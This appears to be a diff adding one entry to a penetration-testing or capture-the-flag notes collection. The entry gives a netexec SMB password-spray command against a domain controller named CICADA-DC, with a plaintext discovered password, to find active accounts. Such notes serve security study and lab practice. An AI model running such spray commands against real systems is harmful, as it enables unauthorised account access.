@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+Use discovered passwords in a password spray attack.
+
+CONTEXT:
+Attempt to log in using a known password.
+
+METHOD / ANSWER:
+Command: `netexec smb CICADA-DC -u <user> -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success`
+Purpose: To find an active user account.
